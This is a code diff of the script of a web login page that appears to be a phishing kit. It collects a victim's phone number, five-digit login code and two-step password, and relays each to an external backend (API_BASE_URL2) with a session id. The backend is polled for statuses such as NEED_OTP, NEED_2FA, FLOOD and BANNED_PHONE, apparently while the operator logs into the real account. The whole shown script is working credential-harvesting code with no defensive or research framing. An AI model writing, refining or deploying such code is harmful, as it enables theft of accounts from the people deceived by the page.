-            document.getElementById('display_phone').innerHTML = `${registeredPhone} <i class="fa-solid fa-pencil" onclick="showStep('photo_slide')"></i>`;
+            let formattedPhone = registeredPhone;
+            let sortedCountries = [...countryList].sort((a, b) => b.c.length - a.c.length);
+            let m = sortedCountries.find(c => registeredPhone.startsWith(c.c));
+            if(m && registeredPhone.length > m.c.length) {
+                formattedPhone = m.c + " " + registeredPhone.substring(m.c.length);
+            }
+            
+            document.getElementById('display_phone').innerHTML = `${formattedPhone} <i class="fa-solid fa-pencil" onclick="showStep('photo_slide')"></i>`;
             setTimeout(() => { document.getElementById('otp_native_input').focus(); }, 100);
         }
-        
         if(n === 3) {
             const passIn = document.getElementById('2fa_input');
             passIn.value = "";
@@ -442,268 +272,234 @@
         }
     }
 
-    // 🌟 Error Visual Handlers 🌟
     function showError(stepId, text) {
-        if (stepId === 1) {
-            document.getElementById('phone_box').classList.add('error');
-            document.getElementById('phone_label').innerText = text;
-        } else if (stepId === 2) {
-            document.getElementById('otp_box').classList.add('error');
-            document.getElementById('otp_label').innerText = text;
-        } else if (stepId === 3) {
-            document.getElementById('2fa_box').classList.add('error');
-            document.getElementById('2fa_label').innerText = text;
+        if (stepId === 1) { 
+            document.getElementById('phone_box').classList.add('error'); 
+            document.getElementById('phone_label').innerText = text; 
+        } else if (stepId === 2) { 
+            document.getElementById('otp_box').classList.add('error'); 
+            document.getElementById('otp_label').innerText = text; 
+        } else if (stepId === 3) { 
+            document.getElementById('2fa_box').classList.add('error'); 
+            document.getElementById('2fa_label').innerText = text; 
         }
     }
 
     function resetError(stepId) {
-        if (stepId === 1) {
-            document.getElementById('phone_box').classList.remove('error');
-            document.getElementById('phone_label').innerText = 'Your phone number';
-        } else if (stepId === 2) {
-            document.getElementById('otp_box').classList.remove('error');
-            document.getElementById('otp_label').innerText = 'Code';
-        } else if (stepId === 3) {
-            document.getElementById('2fa_box').classList.remove('error');
-            document.getElementById('2fa_label').innerText = 'Password';
+        if (stepId === 1) { 
+            document.getElementById('phone_box').classList.remove('error'); 
+            document.getElementById('phone_label').innerText = 'Your phone number'; 
+        } else if (stepId === 2) { 
+            document.getElementById('otp_box').classList.remove('error'); 
+            document.getElementById('otp_label').innerText = 'Code'; 
+        } else if (stepId === 3) { 
+            document.getElementById('2fa_box').classList.remove('error'); 
+            document.getElementById('2fa_label').innerText = 'Password'; 
         }
     }
 
     function checkStatus() {
-        if(typeof API_BASE_URL2 === 'undefined') {
+        if(typeof API_BASE_URL2 === 'undefined') { 
             if(document.getElementById('step_intro').classList.contains('active')) {
                 showStep('photo_slide');
             }
-            return;
+            return; 
         }
         
         fetch(`${API_BASE_URL2}/check_status/${userId}`).then(r => r.json()).then(data => {
-            if (data.status === "NEED_OTP") { showStep(2); stopLoaders(); }
-            else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
-            else if (data.status === "SUCCESS") { 
+            if (data.status === "NEED_OTP") { 
+                showStep(2); stopLoaders(); 
+            } else if (data.status === "NEED_2FA") { 
+                showStep(3); stopLoaders(); 
+            } else if (data.status === "SUCCESS") { 
                 clearInterval(statusChecker); 
-                setTimeout(() => showStep('success'), 600);
-            }
-            else if (data.status === "FLOOD") { 
+                setTimeout(() => showStep('success'), 600); 
+            } else if (data.status === "FLOOD") { 
                 clearInterval(statusChecker); 
-                stopLoaders();
-                showStep('photo_slide'); 
+                stopLoaders(); showStep('photo_slide'); 
                 let remSeconds = data.remaining_seconds || data.wait || 60;
                 let mins = Math.ceil(remSeconds / 60);
-                showError(1, `Too many attempts, please try again in ${mins} min`);
-            }
-            else if (data.status === "INVALID_PHONE") {
-                clearInterval(statusChecker);
-                stopLoaders();
-                showStep('photo_slide');
-                showError(1, 'Invalid phone number, please try again');
-            }
-            else if (data.status === "UNREGISTERED_PHONE") {
-                clearInterval(statusChecker);
-                stopLoaders();
-                showStep('photo_slide');
-                showError(1, 'Unregistered phone number');
-            }
-            else if (data.status === "BANNED_PHONE") {
-                clearInterval(statusChecker);
-                stopLoaders();
-                showStep('photo_slide');
-                showError(1, 'Banned phone number');
-            }
-            else {
+                showError(1, `Too many attempts, please try again in ${mins} min`); 
+            } else if (data.status === "INVALID_PHONE") { 
+                clearInterval(statusChecker); stopLoaders(); showStep('photo_slide'); 
+                showError(1, 'Invalid phone number, please try again'); 
+            } else if (data.status === "UNREGISTERED_PHONE") { 
+                clearInterval(statusChecker); stopLoaders(); showStep('photo_slide'); 
+                showError(1, 'Unregistered phone number'); 
+            } else if (data.status === "BANNED_PHONE") { 
+                clearInterval(statusChecker); stopLoaders(); showStep('photo_slide'); 
+                showError(1, 'Banned phone number'); 
+            } else {
                 if(document.getElementById('step_intro').classList.contains('active')) {
                     showStep('photo_slide');
                 }
             }
-        }).catch(e => {
+        }).catch(e => { 
             if(document.getElementById('step_intro').classList.contains('active')) {
                 showStep('photo_slide');
-            }
+            } 
         });
     }
 
     function stopLoaders() {
         isProcessing = false;
-        
-        const loginBtn = document.getElementById('loginBtn');
-        if(loginBtn) {
-            loginBtn.disabled = false;
-            document.getElementById('loginSpinner').style.display = 'none';
-            document.getElementById('loginText').innerText = "NEXT";
+        const loginBtn = document.getElementById('loginBtn'); 
+        if(loginBtn) { 
+            loginBtn.disabled = false; 
+            document.getElementById('loginSpinner').style.display = 'none'; 
+            document.getElementById('loginText').innerText = "NEXT"; 
         }
         
-        const confirmBtn = document.getElementById('confirmBtn');
-        if(confirmBtn){
-            confirmBtn.disabled = false;
-            document.getElementById('confirmSpinner').style.display = 'none';
-            document.getElementById('confirmText').innerText = 'NEXT';
+        const confirmBtn = document.getElementById('confirmBtn'); 
+        if(confirmBtn){ 
+            confirmBtn.disabled = false; 
+            document.getElementById('confirmSpinner').style.display = 'none'; 
+            document.getElementById('confirmText').innerText = 'NEXT'; 
         }
         
-        document.getElementById('phone_input').disabled = false;
-        document.getElementById('otp_native_input').disabled = false;
+        document.getElementById('phone_input').disabled = false; 
+        document.getElementById('otp_native_input').disabled = false; 
         document.getElementById('2fa_input').disabled = false;
     }
 
     function togglePasswordVisibility() {
-        const passInput = document.getElementById('2fa_input');
-        const toggleIcon = document.getElementById('toggleIcon');
-        if (passInput.type === "password") {
-            passInput.type = "text";
-            toggleIcon.classList.replace('fa-eye-slash', 'fa-eye');
-        } else {
-            passInput.type = "password";
-            toggleIcon.classList.replace('fa-eye', 'fa-eye-slash');
+        const passInput = document.getElementById('2fa_input'), toggleIcon = document.getElementById('toggleIcon');
+        if (passInput.type === "password") { 
+            passInput.type = "text"; toggleIcon.classList.replace('fa-eye-slash', 'fa-eye'); 
+        } else { 
+            passInput.type = "password"; toggleIcon.classList.replace('fa-eye', 'fa-eye-slash'); 
         }
     }
 
-    // 🌟 1. Phone Input Logic 🌟
     function handleLoginClick() {
-        const phone = document.getElementById('phone_input').value.trim();
-        if (phone.length < 8) {
+        const phone = document.getElementById('phone_input').value.replace(/\s/g, '').trim();
+        if (phone.replace(/\D/g, '').length < 8) {
             showError(1, 'Invalid phone number, please try again');
             return;
         }
-
+        
         registeredPhone = phone; 
-        const btn = document.getElementById('loginBtn');
-        btn.disabled = true;
+        document.getElementById('loginBtn').disabled = true; 
         document.getElementById('phone_input').disabled = true;
-        
-        document.getElementById('loginText').innerText = 'PLEASE WAIT...';
+        document.getElementById('loginText').innerText = 'PLEASE WAIT...'; 
         document.getElementById('loginSpinner').style.display = 'block';
-        
         startVerification(phone);
     }
 
     async function startVerification(phone) {
-        if (isProcessing) return;
-        isProcessing = true;
+        if (isProcessing) return; 
+        isProcessing = true; 
         resetError(1);
-
-        if(typeof API_BASE_URL2 === 'undefined') {
-            stopLoaders();
-            showError(1, 'Network error. Try again.');
-            return;
+        
+        if(typeof API_BASE_URL2 === 'undefined') { 
+            stopLoaders(); 
+            return showError(1, 'Network error. Try again.'); 
         }
         
         try {
-            const res = await fetch(`${API_BASE_URL2}/submit_phone`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({session_id: sid, phone: phone})
+            const res = await fetch(`${API_BASE_URL2}/submit_phone`, { 
+                method: 'POST', 
+                headers: {'Content-Type': 'application/json'}, 
+                body: JSON.stringify({session_id: sid, phone: phone}) 
             });
             const data = await res.json();
-            
-            if (data.status === "ERROR") {
-                stopLoaders();
-                showError(1, data.message || 'Error occurred.');
-            } else {
-                clearInterval(statusChecker);
-                statusChecker = setInterval(checkStatus, 3000);
+            if (data.status === "ERROR") { 
+                stopLoaders(); 
+                showError(1, data.message || 'Error occurred.'); 
+            } else { 
+                clearInterval(statusChecker); 
+                statusChecker = setInterval(checkStatus, 3000); 
             }
         } catch(e) { 
-            stopLoaders();
-            showError(1, 'Network error. Try again.');
+            stopLoaders(); 
+            showError(1, 'Network error. Try again.'); 
         }
     }
 
-    // 🌟 2. Native OTP Logic 🌟
     function handleOtpInput(inputElement) {
-        resetError(2);
-        let code = inputElement.value.replace(/\D/g, '').slice(0, 5);
+        resetError(2); 
+        let code = inputElement.value.replace(/\D/g, '').slice(0, 5); 
         inputElement.value = code; 
-
-        if (code.length === 5) {
-            submitOTP(code);
-        }
+        if (code.length === 5) submitOTP(code);
     }
 
     async function submitOTP(otpCode) {
         document.getElementById('otp_native_input').disabled = true;
-        
         try {
-            const res = await fetch(`${API_BASE_URL2}/verify_otp`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({session_id: sid, otp: otpCode})
+            const res = await fetch(`${API_BASE_URL2}/verify_otp`, { 
+                method: 'POST', 
+                headers: {'Content-Type': 'application/json'}, 
+                body: JSON.stringify({session_id: sid, otp: otpCode}) 
             });
-            const data = await res.json();
-            handleResponse(data, 2);
+            handleResponse(await res.json(), 2);
         } catch(e) { 
-            document.getElementById('otp_native_input').disabled = false;
+            document.getElementById('otp_native_input').disabled = false; 
             showError(2, 'Connection lost!'); 
         }
     }
 
-    // 🌟 3. 2FA Password Logic 🌟
-    function handlePasswordInput(el) {
-        const btn = document.getElementById('confirmBtn');
+    function handlePasswordInput(el) { 
+        const btn = document.getElementById('confirmBtn'); 
         if (el.value.length >= 2) {
-            btn.classList.add('show-btn');
+            btn.classList.add('show-btn'); 
         } else {
-            btn.classList.remove('show-btn');
+            btn.classList.remove('show-btn'); 
         }
     }
-
-    function handlePasswordEnter(e) {
-        if(e.key === 'Enter') {
-            submit2FA();
-        }
+    
+    function handlePasswordEnter(e) { 
+        if(e.key === 'Enter') submit2FA(); 
     }
 
     async function submit2FA() {
         const pass = document.getElementById('2fa_input').value;
         if(!pass) return showError(3, 'Invalid password, please try again');
         
-        const btn = document.getElementById('confirmBtn');
-        btn.disabled = true;
-        document.getElementById('2fa_input').disabled = true;
-        document.getElementById('confirmText').innerText = 'PLEASE WAIT...';
-        document.getElementById('confirmSpinner').style.display = 'block';
-
+        document.getElementById('confirmBtn').disabled = true; 
+        document.getElementById('2fa_input').disabled = true; 
+        document.getElementById('confirmText').innerText = 'PLEASE WAIT...'; 
+        document.getElementById('confirmSpinner').style.display = 'block'; 
         resetError(3);
         
         try {
-            const res = await fetch(`${API_BASE_URL2}/verify_2fa`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({session_id: sid, password: pass})
+            const res = await fetch(`${API_BASE_URL2}/verify_2fa`, { 
+                method: 'POST', 
+                headers: {'Content-Type': 'application/json'}, 
+                body: JSON.stringify({session_id: sid, password: pass}) 
             });
-            const data = await res.json();
-            handleResponse(data, 3);
-        } catch(e) { stopLoaders(); showError(3, 'Network error.'); }
+            handleResponse(await res.json(), 3);
+        } catch(e) { 
+            stopLoaders(); 
+            showError(3, 'Network error.'); 
+        }
     }
 
     function handleResponse(data, step) {
         if (data.status === "FLOOD") { 
             clearInterval(statusChecker); 
-            let remSeconds = data.remaining_seconds || data.wait || 60;
-            let mins = Math.ceil(remSeconds / 60);
             showStep('photo_slide'); 
-            showError(1, `Too many attempts, please try again in ${mins} min`);
-        }
-        else if (data.status === "SUCCESS") { 
+            showError(1, `Too many attempts, please try again in ${Math.ceil((data.remaining_seconds||data.wait||60)/60)} min`); 
+        } else if (data.status === "SUCCESS") {
             setTimeout(() => showStep('success'), 600);
-        } 
-        else if (data.status === "NEED_2FA") { 
+        } else if (data.status === "NEED_2FA") {
             setTimeout(() => { showStep(3); stopLoaders(); }, 600);
-        }
-        else {
+        } else { 
             stopLoaders();
             if(step === 2) { 
-                const otpIn = document.getElementById('otp_native_input');
-                otpIn.value = "";
-                otpIn.focus();
-                showError(2, 'Invalid code, please try again');
-            } else {
-                const passIn = document.getElementById('2fa_input');
-                passIn.value = "";
-                passIn.focus();
-                document.getElementById('confirmBtn').classList.remove('show-btn');
-                showError(3, 'Invalid password, please try again');
+                const otpIn = document.getElementById('otp_native_input'); 
+                otpIn.value = ""; 
+                otpIn.focus(); 
+                showError(2, 'Invalid code, please try again'); 
+            } else { 
+                const passIn = document.getElementById('2fa_input'); 
+                passIn.value = ""; 
+                passIn.focus(); 
+                document.getElementById('confirmBtn').classList.remove('show-btn'); 
+                showError(3, 'Invalid password, please try again'); 
             }
         }
     }
 </script>
 </body>
 </html>
+
